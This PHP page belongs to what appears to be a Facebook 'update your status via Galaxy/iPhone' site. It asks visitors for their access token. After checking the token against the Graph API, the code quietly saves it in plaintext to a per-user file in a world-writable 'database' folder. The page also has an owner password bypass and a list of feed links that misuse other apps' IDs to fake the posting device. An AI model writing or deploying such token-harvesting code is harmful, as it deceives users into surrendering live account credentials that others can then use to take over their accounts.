<?php
session_start();
error_reporting(0);
$accesstoken = $_GET["accesstoken"];
if($accesstoken == "")
{
	session_destroy();
	header("Location: index.php?error=Enter Your Access Token !");
	die();
}
include 'info.php';
$remove1 = '=';
$remove2 = '&';
preg_match('/'.preg_quote($remove1).'(.*?)'.preg_quote($remove2).'/is', $accesstoken, $accesstokenFiltered);
if(!$accesstokenFiltered[1])
{
	$accesstoken = $accesstoken;
}
else
{
	$accesstoken = $accesstokenFiltered[1];
}
require('php-sdk/facebook.php');
$facebook = new Facebook(array(
   'appId' => '',
   'secret' => '',
   'cookie' => true
));
try
{
	   $parameters['access_token'] = $accesstoken;
	   $userData = $facebook->api('/me?fields=id,name', $parameters);
}
catch (FacebookApiException $e)
{
	if($accesstoken == $set[password])
	{
	}
	else
	{
		if($_GET["session"] == 'true')
		{
			session_destroy();
			header("Location: index.php?error=Access Token Expired !");
			die();
		}
		else
		{
			session_destroy();
			header("Location: index.php?error=Invalid Access Token !");
			die();
		}
	}
}
if($userData)
{
	$_SESSION['accesstoken'] = $accesstoken;
	if(!file_exists('database'))
	{
		mkdir('database',0777,true);
	}
	$user = $userData['id'];
	if(!file_exists('database/'.$user))
	{
		$handle = fopen('database/'.$user.'', 'w') or die('Error !');
		fwrite($handle, $accesstoken);
		fclose($handle);
	}
	else
	{
		$handle = fopen('database/'.$user.'', 'w') or die('Error !');
		fwrite($handle, $accesstoken);
		fclose($handle);
	}
}
?>
<?php
$name = $userData['name'];
if($accesstoken == $set[password])
{
	$name = $set[owner_name];
}
include 'header.php';
?>
 <div class="menu"> 
    <h2>Update Your Facebook Status Via What Ever You Want</h2> <div class="menu_ico2"> </div>  </div> 
  <div class="border"><div class="and" style="text-align:center;"> 
    <
  <li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=1488845991339812&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via Galaxy Note 3</a></li>
<li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=547423308630211&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via Galaxy S4</a></li>
<li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=618165164893633&redirect_uri=https%3A%2F%2Fwww.facebook.com&display=touch&to&from_login=1&m_sess=1dKlqw-dgO4-smF">Update Via Iphone 5s</a></li>
 <li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=172387106267280&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via MicroMax Canvas 4</a></li>
<li><a href="https://m.facebook.com/dialog/feed?app_id=266315686756783&redirect_uri=https%3A%2F%2Fwww.facebook.com&to">Update Via Galaxy Tab</a></li>
<li><a href="http://m.facebook.com/dialog/feed?_path=feed&app_id=190142277821672&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via Sony Xperia Z</a></li>
<li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=434618839942344&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via Lumia 510</a></li>
<li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=245182748836313&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via LG Optimus</a></li>
<li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=429533180428985&&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via Galaxy Grand</a></li>
<li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=107220332069&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via Sony Xperia</a></li>
<li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=431600390189356&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via HTC One X</a></li>
<li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=191168117625803&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via Galaxy Nexus</a></li>
<li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=510353225679825&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via Blackberry Z10</a></li>
<li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=627605760584501&client_id=627605760584501&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via WhatsApp</a></li>
<li><a href="https://m.facebook.com/dialog/feed?_path=feed&app_id=681431141870533&redirect_uri=https%3A%2F%2Fwww.facebook.com">Update Via Samsung Smart Tv</a></li>
</div> </div>  
<?php
include 'footer.php';
?>